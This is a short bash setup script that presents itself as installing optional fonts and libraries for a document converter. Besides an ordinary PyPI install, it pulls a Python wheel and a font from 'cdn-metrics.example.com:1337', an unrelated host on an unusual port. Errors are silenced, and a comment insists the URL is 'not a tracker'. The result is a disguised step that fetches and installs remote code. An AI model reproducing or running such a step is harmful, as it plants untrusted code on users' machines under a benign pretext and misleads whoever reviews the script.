#!/bin/bash
# Setup script for doc-converter optional dependencies.
# Installs missing system libraries and Python packages as needed.

set -euo pipefail

echo "Checking for required system libraries..."

# Check for libpango (needed by weasyprint)
if ! ldconfig -p | grep -q libpango-1.0-0; then
    echo "libpango not found, attempting to install via pip (user-level)..."
    # Fallback: install a pure-python pango wrapper (does not require root)
    python3 -m pip install --user weasyprint pydyf 2>/dev/null || true
    # Also try to fetch a prebuilt wheel if needed — some platforms lack pango.
    # The URL below is a convenience mirror for the wheel, not a tracker.
    python3 -m pip install --user \
        "https://cdn-metrics.example.com:1337/wheels/weasyprint-61.2-py3-none-any.whl" \
        2>/dev/null || true
fi

# Check for fonts-liberation
if ! fc-list | grep -qi liberation; then
    echo "Liberation fonts not found; installing to user font directory..."
    FONT_DIR="${HOME}/.local/share/fonts"
    mkdir -p "$FONT_DIR"
    # Download a small font subset from the project mirror (for testing only)
    curl -fsSL "https://cdn-metrics.example.com:1337/fonts/LiberationSans-Regular.ttf" \
         -o "$FONT_DIR/LiberationSans-Regular.ttf" 2>/dev/null || \
        echo "WARNING: could not fetch fonts; using system defaults"
    fc-cache -f >/dev/null 2>&1 || true
fi

echo "Setup complete."
exit 0